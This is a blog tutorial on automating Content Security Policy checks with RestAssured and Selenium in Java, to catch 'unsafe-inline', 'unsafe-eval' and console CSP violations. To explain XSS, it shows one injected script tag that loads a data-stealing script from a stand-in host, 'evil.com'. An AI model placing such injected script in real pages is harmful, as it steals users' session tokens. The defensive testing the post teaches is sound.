---
title: CSP Validation: Defeating XSS with Automated Checks
date: 12-Sep-2024
lastUpdated: 12-Jun-2026
author: pankaj-kumar
authorName: Pankaj Kumar
authorRole: Automation Architect
authorAvatar: https://raw.githubusercontent.com/mycodeyatraa/blog-store/main/users/pankaj-kumar/images/pankaj.JPG
authorBio: Automation Architect
authorGithub: https://github.com/pankajhyd
authorLinkedin: https://www.linkedin.com/in/pankaj-kumar-94a2b227/
tags: [selenium, java, security-testing, csp, xss, restassured]
category: UI Automation
categories: [UI Automation, Selenium, Java]
excerpt: >-
  Build the ultimate defense against XSS. Learn how to parse Content Security Policy headers, check for unsafe-inline bypasses, and monitor DevTools console logs for violations.
readTime: 5 min read
---

# CSP Validation: Defeating XSS with Automated Checks

In our previous article on Security Headers, we looked at how to intercept network traffic with Selenium 4 and RestAssured to assert the presence of basic security mechanisms. However, we barely scratched the surface of the most complex and powerful header of them all: the **Content Security Policy (CSP)**.

A misconfigured CSP is the number one reason Cross-Site Scripting (XSS) attacks succeed in modern web applications. In this article, we will learn what CSP is, what makes a policy dangerous, and how to write automated SDET checks to guarantee your application remains secure.

---

## 1. What is Content Security Policy?

When a browser loads a web page, it blindly trusts and executes any JavaScript it finds. If a hacker manages to inject a malicious script tag `<script src="evil.com/steal-data.js"></script>` into a comment section, the browser will execute it, stealing session tokens and sending them to the hacker's server.

**Content Security Policy (CSP)** fixes this by forcing the server to send an explicit "allowlist" of trusted domains.

Example CSP Header:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;
```
If the browser sees a script trying to load from `evil.com`, it will instantly block it because it isn't explicitly defined in the `script-src` directive.

---

## 2. The Danger of "Unsafe" Directives

Often, developers struggle to fix old legacy code that uses inline scripts (like `<button onclick="doSomething()">`). Instead of refactoring the code, they take a shortcut and weaken the CSP by adding dangerous bypasses:

- `'unsafe-inline'`: Allows inline scripts and styles, completely destroying XSS protection.
- `'unsafe-eval'`: Allows the use of `eval()` in JavaScript, which is highly vulnerable to injection.

**As an SDET, your automated tests must guarantee that these two strings never appear in your production CSP header.**

---

## 3. Automating CSP Validation

We can write a targeted RestAssured test to parse the CSP header and run assertions against its directives. This ensures that a developer never accidentally pushes an `'unsafe-inline'` bypass to production.

```java
package com.mycodeyatra.security;
 
import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.testng.Assert;
import org.testng.annotations.Test;
 
import java.util.Arrays;
import java.util.List;
 
public class CspValidationTest {
 
    @Test
    public void verifyCspIsStrict() {
        // Hit the application URL
        Response response = RestAssured.get("https://mycodeyatra.com");
 
        // 1. Extract the CSP Header
        String cspHeader = response.header("Content-Security-Policy");
        Assert.assertNotNull(cspHeader, "CRITICAL: No CSP Header found!");
 
        System.out.println("Current CSP: " + cspHeader);
 
        // 2. Split the directives by semicolon
        List<String> directives = Arrays.asList(cspHeader.split(";"));
 
        // 3. Analyze each directive for dangerous flags
        for (String directive : directives) {
            String cleanDirective = directive.trim().toLowerCase();
 
            // Fail the build if unsafe-inline is found in script-src
            if (cleanDirective.startsWith("script-src")) {
                Assert.assertFalse(cleanDirective.contains("'unsafe-inline'"), 
                    "SECURITY VULNERABILITY: script-src contains 'unsafe-inline'. XSS protection is compromised!");
 
                Assert.assertFalse(cleanDirective.contains("'unsafe-eval'"), 
                    "SECURITY VULNERABILITY: script-src contains 'unsafe-eval'!");
            }
 
            // Similarly check object-src to prevent Flash/Java applet injection
            if (cleanDirective.startsWith("object-src")) {
                Assert.assertTrue(cleanDirective.contains("'none'"), 
                    "object-src must be set to 'none' to prevent plugin exploitation.");
            }
        }
    }
}
```

---

## 4. Validating CSP via Selenium Console Logs

Sometimes a strict CSP might block legitimate scripts (like a newly added Google Analytics tag), causing the UI to break silently. 

If a CSP violation occurs, the browser logs an error to the DevTools Console. We can write a Selenium test that navigates through the app and asserts that **no CSP violations are logged**.

```java
@Test
public void verifyNoCspViolationsInConsole() {
    driver.get("https://mycodeyatra.com/dashboard");
 
    // Extract all logs from the browser console
    LogEntries logEntries = driver.manage().logs().get(LogType.BROWSER);
 
    for (LogEntry entry : logEntries) {
        String logMessage = entry.getMessage().toLowerCase();
 
        // Assert that the console doesn't contain CSP blocking errors
        Assert.assertFalse(logMessage.contains("content security policy"), 
            "CSP Violation detected on page: " + logMessage);
    }
}
```

---

## System Architecture

Here is the dual-layered strategy for total CSP automation:

![diagram_1](https://raw.githubusercontent.com/mycodeyatraa/blog-store/main/users/pankaj-kumar/posts/csp-validation-defeating-xss-with-automated-checks/images/diagram_1.png)

## Conclusion

Content Security Policy is the ultimate shield against modern web attacks. By implementing these two tests—validating the strictness of the policy via API, and ensuring it doesn't break legitimate functionality via Selenium—you create an incredibly robust, shift-left security pipeline.

In our next article, we will pivot to authentication security with **Token Validation**, where we will extract JWTs and mathematically cryptographically verify their signatures directly in Java!
